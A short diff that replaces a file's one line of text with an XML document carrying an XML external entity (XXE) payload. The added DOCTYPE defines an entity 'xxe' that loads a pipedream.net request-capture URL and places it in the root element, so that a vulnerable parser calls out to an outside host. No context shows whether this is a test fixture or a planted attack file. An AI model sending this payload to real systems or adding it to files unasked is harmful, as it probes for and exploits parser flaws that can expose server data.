@@ -1,1 +1,4 @@
-content
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "https://enuz08tcaa9sj.x.pipedream.net">]><foo>&xxe;</foo>
